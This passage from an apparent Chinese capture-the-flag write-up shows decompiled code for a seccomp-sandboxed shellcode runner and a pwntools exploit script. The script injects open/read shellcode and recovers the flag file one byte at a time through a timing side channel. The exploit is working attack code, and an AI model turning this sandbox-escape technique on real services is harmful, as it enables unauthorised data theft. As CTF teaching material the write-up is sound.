  <span class="n">unsigned</span> <span class="n">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="n">A0h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>

  <span class="n">v14</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">);</span>
  <span class="n">sub_A60</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
  <span class="n">v13</span> <span class="o">=</span> <span class="il">0L</span><span class="n">L</span><span class="p">;</span>
  <span class="n">v12</span> <span class="o">=</span> <span class="il">0L</span><span class="n">L</span><span class="p">;</span>
  <span class="n">v11</span> <span class="o">=</span> <span class="il">0L</span><span class="n">L</span><span class="p">;</span>
  <span class="n">buf</span> <span class="o">=</span> <span class="il">0L</span><span class="n">L</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s2">"Welcome to silent execution-box."</span><span class="p">);</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">getpagesize</span><span class="p">();</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="n">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x1000</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="il">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="n">uLL</span><span class="p">);</span>
  <span class="n">prctl</span><span class="p">(</span><span class="mi">38</span><span class="p">,</span> <span class="il">1L</span><span class="n">L</span><span class="p">,</span> <span class="il">0L</span><span class="n">L</span><span class="p">,</span> <span class="il">0L</span><span class="n">L</span><span class="p">,</span> <span class="il">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">prctl</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="il">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">v8</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="il">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="il">2147418112L</span><span class="n">L</span><span class="p">,</span> <span class="il">2L</span><span class="n">L</span><span class="p">,</span> <span class="il">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="il">2147418112L</span><span class="n">L</span><span class="p">,</span> <span class="il">0L</span><span class="n">L</span><span class="p">,</span> <span class="il">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">seccomp_load</span><span class="p">(</span><span class="n">v8</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">v11</span><span class="p">;</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">v12</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v9</span> <span class="o">+</span> <span class="mi">48</span><span class="p">)</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v9</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v9</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v9</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="p">((</span><span class="n">void</span> <span class="p">(</span><span class="n">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">__int64</span><span class="p">,</span> <span class="n">__int64</span><span class="p">,</span> <span class="n">__int64</span><span class="p">))</span><span class="n">v9</span><span class="p">)(</span><span class="il">3735928559L</span><span class="n">L</span><span class="p">,</span> <span class="il">3735928559L</span><span class="n">L</span><span class="p">,</span> <span class="il">3735928559L</span><span class="n">L</span><span class="p">);</span>
  <span class="k">return</span> <span class="il">0L</span><span class="n">L</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240822182307-8636c3f4-6070-1.png"/><br/>
exp1</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>
<span class="n">s</span><span class="o">=</span><span class="mi">4</span>  <span class="c1">#0 4 8  12 16 20                               四个字节一组爆破</span>
<span class="n">e</span><span class="o">=</span><span class="mi">8</span> <span class="c1">#4 8 12 16 20 24 </span>
<span class="n">flag</span><span class="o">=</span><span class="s2">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">e</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x80</span><span class="p">):</span>
        <span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">"./pwn"</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Welcome to silent execution-box.</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
        <span class="n">payload</span><span class="o">=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">"flag"</span><span class="p">)</span>                 <span class="c1">####打开flag文件</span>
        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">+</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s2">"rax"</span><span class="p">,</span><span class="mh">0x10080</span><span class="p">,</span><span class="mi">30</span><span class="p">)</span>
        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">+</span><span class="s1">'''</span>
<span class="s1">    loop:</span>
<span class="s1">    cmp byte ptr [0x10080+{0}],{1}</span>
<span class="s1">    je loop</span>
<span class="s1">        '''</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
        <span class="n">begin</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
            <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">pass</span>
            <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">end</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">end</span><span class="o">-</span><span class="n">begin</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">:</span>
            <span class="n">flag</span><span class="o">=</span><span class="n">flag</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="s2">"第"</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="s2">"位"</span><span class="o">+</span><span class="s2">"到第"</span><span class="p">,</span><span class="n">e</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="s2">"位的内容："</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
            <span class="k">break</span>
</pre></div>
</div>
</div>